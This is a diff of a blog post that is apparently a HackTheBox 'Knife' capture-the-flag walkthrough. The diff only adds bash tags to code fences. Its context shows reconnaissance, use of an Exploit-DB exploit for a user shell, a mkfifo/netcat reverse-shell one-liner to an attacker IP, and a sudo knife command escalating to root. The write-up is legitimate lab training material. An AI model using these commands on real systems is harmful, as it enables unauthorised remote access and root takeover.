@@ -25,7 +25,7 @@ In this blog, we are going to discuss about pwning knife from hackthebox.
 
 ## Reconnaissance
 ### Nmap
-```
+```bash
 ┌─[v1nc1d4@V1NC1D4]─[~/Desktop/HTB/LAB/knife]
 └──╼ $nmap -A -v 10.10.10.242                                                                           
 PORT   STATE SERVICE VERSION
@@ -47,7 +47,7 @@ You can read more about OPTIONS method [here](https://developer.mozilla.org/en-U
 
 Since this is related to HTTP methods, we can use the `curl` command-line program to issue an OPTION request.
 
-```
+```bash
 ┌─[v1nc1d4@V1NC1D4]─[~/Desktop/HTB/LAB/knife]
 └──╼ $curl -X OPTIONS http://10.10.10.242 -i
 HTTP/1.1 200 OK
@@ -72,7 +72,7 @@ Download the [Exploit](https://www.exploit-db.com/exploits/49933)
 
 Let's use the exploit. It will ask us for the target URL, as we append the target URL in the exploit, we will get shell as user.
 
-```
+```bash
 ┌─[v1nc1d4@V1NC1D4]─[~/Desktop/HTB/LAB/knife]
 └──╼ $python3 exploit.py
 Enter the full host url:
@@ -85,7 +85,7 @@ uid=1000(james) gid=1000(james) groups=1000(james)
 ```
 We do not have a stable shell. Let's take a reliable reverse shell.
 
-```
+```bash
 ┌─[v1nc1d4@V1NC1D4]─[~/Desktop/HTB/LAB/knife]
 └──╼ $python3 exploit.py
 Enter the full host url:
@@ -98,7 +98,7 @@ $ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 4444 >/tmp/f
 
 Start netcat listener on the specified port, we get a reliable reverse shell. Upgrade to a stable shell.
 
-```
+```bash
 ┌─[v1nc1d4@V1NC1D4]─[~/Desktop/HTB/LAB/knife]
 └──╼ $nc -nlvp 4444
 listening on [any] 4444 ...
@@ -111,7 +111,7 @@ james@knife:/$
 ```
 we can find the user flag under the directory `/home/james`
 
-```
+```bash
 james@knife:~$ pwd
 pwd
 /home/james
@@ -124,7 +124,7 @@ james@knife:~$
 ## Privilege Escalation
 
 Let's move forward, checking sudo rights we can find that user `james` is allowed to run /usr/bin/knife as root.
-```
+```bash
 james@knife:~$ sudo -l
 sudo -l
 Matching Defaults entries for james on knife:
@@ -141,7 +141,7 @@ Let's see what [gtfobins](https://gtfobins.github.io) have to say about `knife`
 
 Let's get the root shell
 
-```
+```bash
 james@knife:~$ sudo /usr/bin/knife exec -E 'exec "/bin/sh"'                               
 sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
 # id
@@ -151,7 +151,7 @@ uid=0(root) gid=0(root) groups=0(root)
 ```
 Root flag can be found under the directory `/root`
 
-```
+```bash
 # cd /root
 cd /root
 # ls
